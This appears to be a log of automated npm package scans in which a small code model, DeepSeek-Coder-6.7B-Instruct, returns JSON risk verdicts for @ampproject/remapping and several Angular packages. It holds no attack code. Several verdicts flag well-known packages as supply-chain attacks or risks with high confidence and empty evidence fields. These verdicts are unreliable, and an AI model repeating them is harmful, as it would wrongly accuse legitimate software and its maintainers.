+@ampproject/remapping,2.2.1,2025-12-15T14:32:04.857866,DeepSeek-Coder-6.7B-Instruct,v2.0,1,supply_chain_attack,"[""supply_chain_attack""]",0.8,"### Response:
+Based on the provided code snippets and structural analysis context, the following potential security risks and malicious behaviors are identified:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""supply_chain_attack"",
+      ""summary"": ""The package appears to be a part of a supply chain attack as it uses obfuscation to hide its true code."",
+      ""details"": ""The code snippet contains obfuscation pattern 'IIFE obfuscation wrapper' which is a common technique used in supply chain attacks to hide the original source code."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""supply_chain_attack""
+  ]
+}
+```
+
+This package appears to be a part of a supply chain attack as it uses obfuscation to hide its true code. The confidence score is 0.8, indicating high confidence in the detection of this behavior.","{""behaviors"": [{""category"": ""supply_chain_attack"", ""summary"": ""The package appears to be a part of a supply chain attack as it uses obfuscation to hide its true code."", ""details"": ""The code snippet contains obfuscation pattern 'IIFE obfuscation wrapper' which is a common technique used in supply chain attacks to hide the original source code."", ""confidence"": 0.8, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRDB5220DF""}], ""risk_vector"": [""supply_chain_attack""]}"
+@angular/cdk,16.2.5,2025-12-15T14:32:09.713155,DeepSeek-Coder-6.7B-Instruct,v2.0,0,,[],0,"### Response:
+Based on the provided information, there are no potential malicious behaviors, supply chain attacks, or security risks identified in the code snippets or structural analysis context. Therefore, the JSON output would be empty.
+
+```json
+{
+  ""behaviors"": [],
+  ""risk_vector"": []
+}
+```","{""behaviors"": [], ""risk_vector"": []}"
+@angular/common,16.2.6,2025-12-15T14:32:14.088234,DeepSeek-Coder-6.7B-Instruct,v2.0,0,,[],0,"### Response:
+Based on the provided information, there are no potential malicious behaviors, supply chain attacks, or security risks identified in the code snippets or structural analysis context. Therefore, the JSON output would be as follows:
+
+```json
+{
+  ""behaviors"": [],
+  ""risk_vector"": []
+}
+```
+
+This output indicates that no malicious behaviors, supply chain attacks, or security risks were found in the analyzed code.","{""behaviors"": [], ""risk_vector"": []}"
+@angular/compiler-cli,16.2.6,2025-12-15T14:32:34.160484,DeepSeek-Coder-6.7B-Instruct,v2.0,3,dependency_injection;executable_binary;supply_chain_propagation,"[""dependency_injection"", ""supply_chain_propagation"", ""executable_binary""]",0.8,"### Response:
+Based on the provided information, the potential malicious behaviors and security risks identified are:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""dependency_injection"",
+      ""summary"": ""Dependency injection of non-scoped packages"",
+      ""details"": ""The Angular compiler-cli package is depending on non-scoped packages like reflect-metadata, chokidar, convert-source-map, semver, tslib, and yargs. This could potentially lead to dependency confusion and potential security risks."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""supply_chain_propagation"",
+      ""summary"": ""Propagation of malicious packages"",
+      ""details"": ""The Angular compiler-cli package is depending on packages that could potentially propagate malicious code or attacks. This could lead to supply chain attacks."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""executable_binary"",
+      ""summary"": ""Package defines 'bin' scripts"",
+      ""details"": ""The Angular compiler-cli package defines 'bin' scripts which may execute arbitrary code. This could lead to potential malicious behavior."",
+      ""confidence"": 0.7,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""dependency_injection"",
+    ""supply_chain_propagation"",
+    ""executable_binary""
+  ]
+}
+```
+
+Please note that the confidence scores are subjective and may vary based on the specific context and analysis of the code snippets and structural analysis context. The 'evidence_apis', 'evidence_files', 'evidence_domains', 'evidence_commands', and 'evidence_env_vars' fields are currently empty as no specific evidence has been provided.","{""behaviors"": [{""category"": ""dependency_injection"", ""summary"": ""Dependency injection of non-scoped packages"", ""details"": ""The Angular compiler-cli package is depending on non-scoped packages like reflect-metadata, chokidar, convert-source-map, semver, tslib, and yargs. This could potentially lead to dependency confusion and potential security risks."", ""confidence"": 0.8, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR161B00D5""}, {""category"": ""supply_chain_propagation"", ""summary"": ""Propagation of malicious packages"", ""details"": ""The Angular compiler-cli package is depending on packages that could potentially propagate malicious code or attacks. This could lead to supply chain attacks."", ""confidence"": 0.8, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR306B1BF0""}, {""category"": ""executable_binary"", ""summary"": ""Package defines 'bin' scripts"", ""details"": ""The Angular compiler-cli package defines 'bin' scripts which may execute arbitrary code. This could lead to potential malicious behavior."", ""confidence"": 0.7, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRC459E2D8""}], ""risk_vector"": [""dependency_injection"", ""supply_chain_propagation"", ""executable_binary""]}"
+@angular/core,16.2.6,2025-12-15T14:32:37.570983,DeepSeek-Coder-6.7B-Instruct,v2.0,0,,[],0,"### Response:
+Based on the provided information, there are no potential malicious behaviors, supply chain attacks, or security risks identified in the code snippets or structural analysis context. Therefore, the JSON output would be as follows:
+
+```json
+{
+  ""behaviors"": [],
+  ""risk_vector"": []
+}
+```
+
+This output indicates that no malicious behaviors, supply chain attacks, or security risks were found in the analyzed code.","{""behaviors"": [], ""risk_vector"": []}"
